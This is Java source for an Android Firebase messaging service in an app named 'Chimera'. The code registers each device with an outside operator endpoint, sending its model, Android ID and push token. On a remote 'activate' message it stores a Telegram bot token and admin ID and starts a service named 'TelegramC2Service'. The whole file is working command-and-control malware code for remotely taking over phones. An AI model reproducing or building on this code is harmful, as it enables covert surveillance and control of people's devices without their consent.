package com.chimera;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.provider.Settings;
import androidx.annotation.NonNull;
import com.google.firebase.messaging.FirebaseMessaging;
import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Map;

public class FCMHandlerService extends FirebaseMessagingService {

    @Override
    public void onNewToken(@NonNull String token) {
        super.onNewToken(token);
        registerDevice(this);
    }

    @Override
    public void onMessageReceived(RemoteMessage remoteMessage) {
        super.onMessageReceived(remoteMessage);
        Map<String, String> data = remoteMessage.getData();
        if (data.size() > 0) {
            String action = data.get("action");
            if ("activate".equals(action)) {
                String botToken = data.get("bot_token");
                String adminId = data.get("admin_id");
                if (botToken != null && adminId != null) {
                    saveConfig(botToken, adminId);
                    startMainService();
                }
            } else if ("deactivate".equals(action)) {
                stopMainService();
            }
        }
    }

    public static void registerDevice(Context context) {
        FirebaseMessaging.getInstance().getToken().addOnCompleteListener(task -> {
            if (task.isSuccessful() && task.getResult() != null) {
                String token = task.getResult();
                sendRegistrationToServer(context, token);
            }
        });
    }

    private static void sendRegistrationToServer(Context context, String token) {
        new Thread(() -> {
            try {
                String deviceModel = Build.MANUFACTURER + " " + Build.MODEL;
                String androidId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);

                JSONObject postData = new JSONObject();
                postData.put("fcmToken", token);
                postData.put("deviceName", deviceModel);
                postData.put("deviceId", androidId);

                URL url = new URL("https://chimeradmin.netlify.app/.netlify/functions/register-device");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
                conn.setDoOutput(true);
                conn.setConnectTimeout(15000);
                conn.setReadTimeout(15000);

                try (OutputStream os = conn.getOutputStream()) {
                    os.write(postData.toString().getBytes(StandardCharsets.UTF_8));
                }
                conn.getInputStream().close();
                conn.disconnect();
            } catch (Exception e) {
                ErrorLogger.logError(context, "FCM_Registration", e);
            }
        }).start();
    }

    private void saveConfig(String token, String id) {
        SharedPreferences prefs = getSharedPreferences("chimera_prefs", Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = prefs.edit();
        editor.putString("bot_token", token);
        editor.putLong("admin_id", Long.parseLong(id));
        editor.apply();
    }

    private void startMainService() {
        Intent serviceIntent = new Intent(this, TelegramC2Service.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
    }

    private void stopMainService() {
        stopService(new Intent(this, TelegramC2Service.class));
    }
}